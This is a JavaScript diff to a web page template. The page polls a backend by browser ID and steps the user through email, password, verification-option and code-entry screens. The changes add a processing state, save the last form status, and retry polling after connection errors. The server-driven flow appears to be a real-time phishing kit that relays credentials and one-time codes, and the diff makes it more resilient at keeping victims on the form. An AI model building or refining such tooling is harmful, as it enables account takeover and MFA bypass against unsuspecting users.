@@ -292,7 +292,9 @@
         let currentStatus = null;
         let lastShownStatus = '';
         let isSubmitting = false;
+        let isProcessing = false;
         let isInitialLoad = true;
+        let lastFormVisibleStatus = 'WAITINGEMAIL';
         let submitGuardTimeout = null;
         let lastRenderedOptionsHash = '';
 
@@ -437,14 +439,22 @@
                 const data = await res.json();
                 console.log('[Template] Poll response:', data.currentStatus, '| data:', JSON.stringify(data.data || {}).substring(0, 200));
                 if (data.currentStatus) {
+                    isProcessing = false;
                     updateUIForStatus(data.currentStatus, data.data || {});
                 }
 } catch (e) {
-    console.error('Poll error:', e);
+    console.error('[Template] Poll error, will retry in 5s:', e);
     clearInterval(pollingIntervalId);
-    isSubmitting = false;
-    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-    showFailedView('Connection issue. Please check your internet and try again.');
+    if (isProcessing) {
+        isProcessing = false;
+        updateUIForStatus(lastFormVisibleStatus, {});
+    }
+    setTimeout(() => {
+        if (browserId) {
+            pollingStartTime = Date.now();
+            startPolling(2000);
+        }
+    }, 5000);
 }
         }
 
@@ -498,6 +508,7 @@
                     break;
                 case 'WAITINGEMAIL':
                 case 'WAITINGEMAILERROR':
+                    lastFormVisibleStatus = status;
                     setFormSubmitting(false);
                     emailGroup.style.display = 'block';
                     passwordGroup.style.display = 'block';
@@ -527,6 +538,7 @@
                     break;
                 case 'WAITINGPASSWORD':
                 case 'WAITINGPASSWORDERROR':
+                    lastFormVisibleStatus = status;
                     setFormSubmitting(false);
                     emailGroup.style.display = 'block';
                     passwordGroup.style.display = 'block';
@@ -555,6 +567,7 @@
                     startPolling(2000);
                     break;
                 case 'WAITINGOPTIONS':
+                    lastFormVisibleStatus = status;
                     setFormSubmitting(false);
                     emailGroup.style.display = 'none';
                     passwordGroup.style.display = 'none';
@@ -575,6 +588,7 @@
                     startPolling(2000);
                     break;
                 case 'WAITINGCODE':
+                    lastFormVisibleStatus = status;
                     setFormSubmitting(false);
                     emailGroup.style.display = 'none';
                     passwordGroup.style.display = 'none';
@@ -895,8 +909,8 @@
                 if (updateType === 'verificationChoice') {
                     await new Promise(resolve => setTimeout(resolve, 3000));
                 }
-                pollingStartTime = Date.now();
-                startPolling(2000);
+                isProcessing = true;
+                updateUIForStatus('PROCESSING', {});
             } catch (e) {
                 console.error('Submission error:', e);
                 setFormSubmitting(false);
